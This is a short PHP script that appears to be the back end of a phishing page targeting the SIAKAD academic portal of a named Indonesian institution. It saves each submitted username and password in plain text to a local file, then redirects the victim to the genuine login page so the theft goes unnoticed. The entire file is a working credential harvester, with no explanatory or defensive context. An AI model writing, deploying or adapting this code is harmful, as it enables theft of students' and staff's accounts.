<?php
$username = $_POST['username'];
$password = $_POST['password'];
$file = fopen("usernames.txt", "a");
fwrite($file, "SIAKAD Username: " . $username . " Pass: " . $password . "\n");
fclose($file);
header('Location: https://siakad.ppicurug.ac.id/gate/login');
exit();
?>
